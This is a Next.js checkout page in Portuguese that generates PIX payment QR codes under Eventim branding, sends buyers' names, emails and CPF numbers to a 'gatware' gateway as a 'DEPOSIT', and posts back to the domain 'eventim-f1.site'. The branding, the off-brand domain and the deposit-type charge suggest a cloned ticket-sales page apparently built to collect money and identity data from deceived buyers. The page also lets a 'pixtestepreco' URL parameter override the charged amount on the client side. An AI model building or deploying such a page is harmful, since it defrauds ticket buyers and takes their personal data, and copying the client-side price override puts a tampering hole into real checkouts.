"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import QRCode from "qrcode";
import FooterEventim from "../components/FooterEventim";
import HeaderCheckout from "../components/HeaderCheckout";
import { formatBR } from "@/app/utils/format";

type PixResponse = {
  id: string;
  pix?: { qrcode?: string };
  status?: string;
};

export default function PixPage() {
  const router = useRouter();

  // ESTADOS
  const [loading, setLoading] = useState(true);
  const [pixData, setPixData] = useState<PixResponse | null>(null);
  const [qrImage, setQrImage] = useState<string | null>(null);
  const [paid, setPaid] = useState(false);
  const [copied, setCopied] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [cart, setCart] = useState<any>(null);
  const [customer, setCustomer] = useState<any>(null);
  const [savedOrder, setSavedOrder] = useState<any>(null);

  const [isReady, setIsReady] = useState(false);

  // ==========================
  // CARREGAR LOCALSTORAGE 1X
  // ==========================
  useEffect(() => {
    if (typeof window === "undefined") return;

    const c = localStorage.getItem("cart");
    const cs = localStorage.getItem("customer");
    const so = localStorage.getItem("currentOrder");

    if (!c || !cs) {
      router.push("/checkout");
      return;
    }

    setCart(JSON.parse(c));
    setCustomer(JSON.parse(cs));
    setSavedOrder(so ? JSON.parse(so) : null);

    setIsReady(true);
  }, []);

  // ==========================
  // PEGAR TESTE VIA QUERY
  // ==========================
  function getPixTestAmount() {
    if (typeof window === "undefined") return null;
    const url = new URL(window.location.href);
    const val = url.searchParams.get("pixtestepreco");
    if (!val) return null;

    const num = Number(val);
    return !isNaN(num) && num > 0 ? num : null;
  }

  // ==========================
  // CRIAR / RESTAURAR PIX
  // ==========================
  useEffect(() => {
    if (!isReady) return;

    // 🔥 Prioridade de valor
    const testAmount = getPixTestAmount();

    let amount: number;

    if (testAmount) {
      amount = Number(testAmount) * 100; // PRIORIDADE 1
    } else {
      amount = (cart?.total ?? 0) * 100; // PRIORIDADE 2
    }

    const title = cart?.nome ?? "Pedido";
    const externalRef =
      savedOrder?.externalRef ?? `PED-${Date.now().toString().slice(-6)}`;

    // ======================
    // 🔄 RESTAURAR PEDIDO SALVO
    // SOMENTE SE:
    // - não está em modo teste
    // - o valor salvo === valor atual
    // ======================
    if (
      !testAmount &&
      savedOrder?.status === "pending" &&
      savedOrder.amount === amount
    ) {
      const qrcode = savedOrder.pix_qrcode;

      setPixData({
        id: savedOrder.pix_id,
        pix: { qrcode },
      });

      QRCode.toDataURL(qrcode, { width: 300 }).then(setQrImage);

      const interval = setInterval(async () => {
        const chk = await fetch(`/api/pix/check?id=${savedOrder.pix_id}`);
        const json = await chk.json();

        if (json.status === "paid") {
          clearInterval(interval);
          setPaid(true);
          setTimeout(() => router.push("/checkout/success"), 1200);
        }
      }, 2500);

      setLoading(false);
      return;
    }

    // ======================
    // 🟢 CRIAR PIX NOVO
    // ======================
    async function createPix() {
      try {
        setLoading(true);

        const body = {
          amount,
          paymentMethod: "pix",
          provider: "gatware",
          transactionType: "DEPOSIT",
          description: `Pagamento do pedido ${externalRef}`,
          callbackUrl: "https://eventim-f1.site/api/postback",
          externalRef,

          customer: {
            name: `${customer.firstName} ${customer.lastName}`,
            email: customer.email,
            document: {
              type: "cpf",
              number: customer.cpf,
            },
          },

          items: [
            {
              title,
              unitPrice: amount,
              quantity: cart?.quantity ?? 1,
              tangible: false,
            },
          ],
        };

        const r = await fetch("/api/pix/create", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });

        if (!r.ok) throw new Error("Erro ao gerar PIX");

        const pix = await r.json();
        setPixData(pix);

        const img = await QRCode.toDataURL(pix.pix.qrcode, { width: 300 });
        setQrImage(img);

        // salvar pedido
        localStorage.setItem(
          "currentOrder",
          JSON.stringify({
            externalRef,
            pix_id: pix.id,
            pix_qrcode: pix.pix.qrcode,
            amount,
            title,
            status: "pending",
            created_at: Date.now(),
          })
        );

        // polling
        const interval = setInterval(async () => {
          const chk = await fetch(`/api/pix/check?id=${pix.id}`);
          const json = await chk.json();

          if (json.status === "paid") {
            clearInterval(interval);
            setPaid(true);
            setTimeout(() => router.push("/checkout/success"), 1200);
          }
        }, 2500);
      } catch (e: any) {
        setError(e.message);
      } finally {
        setLoading(false);
      }
    }

    createPix();
  }, [isReady]);

 // ==========================
  // UI ORIGINAL (SEU LAYOUT)
  // ==========================

  const amount = cart ? (getPixTestAmount() ?? cart.total) * 100 : 0;
  const title = cart?.nome ?? "Pedido";
  const externalRef =
    savedOrder?.externalRef ?? `PED-${Date.now().toString().slice(-6)}`;
    
  return (
    <>
      <link rel="stylesheet" href="/eventim/css/patterns.css" />
      <link rel="stylesheet" href="/eventim/css/checkout.css" />

      <style>{`
        .pix-wrapper {
          display: grid;
          gap: 32px;
          margin-top: 20px;
          justify-content: center;
        }
/* SPINNER EVENTIM */
.spinner-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 30px 0;
  gap: 12px;
}

.spinner-circle-checkout {
  width: 40px;
  height: 40px;
  border: 4px solid #d8d8d8;
  border-top-color: #0B74FF;
  border-radius: 50%;
  animation: spin 0.7s linear infinite;
}

@keyframes spin {
  from { transform: rotate(0deg); }
  to   { transform: rotate(360deg); }
}

.spinner-message-checkout {
  font-size: 15px;
  color: #333;
}

        @media (min-width: 992px) {
          .pix-wrapper {
            grid-template-columns: 460px 360px;
          }
        }

        .pix-card {
          background: #fff;
          border-radius: 16px;
          padding: 24px;
          box-shadow: 0 6px 20px rgba(0,0,0,0.08);
        }

        .order-tag {
          background: #eef2ff;
          color: #3b5bdb;
          padding: 6px 12px;
          border-radius: 8px;
          font-weight: 600;
          display: inline-block;
          margin-top: 6px;
          box-shadow: inset 0 0 0 1px #d0d7ff;
        }

        .summary-line {
          padding-bottom: 12px;
          border-bottom: 1px solid #eee;
          margin-top: 12px;
        }

        .btn-primary {
          border-radius: 8px;
          font-size: 16px;
        }

        .qr-img {
          width: 100%;
          max-width: 320px;
          margin: 0 auto;
          display: block;
        }

.card-content {
  display: flex!important;
  flex-direction: column!important;
  justify-content: center!important;
}

.selection-list-headline{
  text-align: center;
}

.order-tag {
    text-align: center;

}
        @media(max-width: 480px){
          .qr-img{
            max-width: 260px;
          }
        }
      `}</style>

      <div
        className="checkout-wrapper-container"
        style={{ background: "#f3f4f7" }}
      >
        <div className="wrapper wrapper-container">
          <HeaderCheckout />

          <div
            className="row card standard-gray-shadow theme-content-bg"
            style={{ marginTop: 40, padding: 24, borderRadius: 16 }}
          >
            <div className="card-content">
              <h2 className="selection-list-headline u-font-weight-bold">
                Pague com PIX
              </h2>

              <div className="order-tag">
                Pedido: <strong>{externalRef}</strong>
              </div>

              <p style={{ marginTop: 10, textAlign: "center" }}>
                {title} — <strong>R$ {formatBR(amount)}</strong>
              </p>

              {/* GRID */}
              <div className="pix-wrapper">
                {/* Caixa PIX */}
                <div className="pix-card">
                  {loading ? (
                    <div className="spinner-wrapper">
                      <div className="spinner-circle-checkout"></div>
                      <div className="spinner-message-message">
                        Gerando PIX…
                      </div>
                    </div>
                  ) : (
                    <>
                      <img
                        src={qrImage ?? ""}
                        className="qr-img"
                        alt="QR Code"
                      />

                      <textarea
                        readOnly
                        value={pixData?.pix?.qrcode ?? ""}
                        style={{
                          width: "100%",
                          marginTop: 15,
                          padding: 12,
                          height: 110,
                          borderRadius: 8,
                          border: "1px solid #ccc",
                        }}
                      />

                      <button
                        className="btn btn-primary btn-lg btn-block"
                        style={{ marginTop: 12 }}
                        onClick={() => {
                          navigator.clipboard.writeText(
                            pixData?.pix?.qrcode ?? ""
                          );
                          setCopied(true);
                          setTimeout(() => setCopied(false), 2500);
                        }}
                      >
                        Copiar PIX
                      </button>

                      <p style={{ marginTop: 10, textAlign: "center" }}>
                        {paid
                          ? "Pagamento confirmado!"
                          : "Aguardando pagamento…"}
                      </p>
                    </>
                  )}
                </div>

                {/* RESUMO DO PEDIDO */}
                <div className="pix-card">
                  <h3 style={{ fontSize: 20, fontWeight: 700 }}>
                    Resumo do Pedido
                  </h3>

                  <div className="summary-line">
                    {title} — {cart?.quantity} unidade(s)
                  </div>

                  <div
                    style={{
                      marginTop: 14,
                      display: "flex",
                      justifyContent: "space-between",
                      fontSize: 18,
                      fontWeight: 600,
                    }}
                  >
                    <span>Total</span>
                    <span>R$ {formatBR(amount)}</span>
                  </div>

                  <button
                    onClick={() => router.push("/checkout")}
                    className="btn btn-default btn-lg btn-block"
                    style={{ marginTop: 20 }}
                  >
                    Voltar
                  </button>
                </div>
              </div>

              {error && (
                <div
                  style={{ marginTop: 14, color: "red", textAlign: "center" }}
                >
                  {error}
                </div>
              )}
            </div>
          </div>

          <FooterEventim />
        </div>
      </div>

      {copied && (
        <div className="pix-toast">Código PIX copiado com sucesso!</div>
      )}
    </>
  );
}
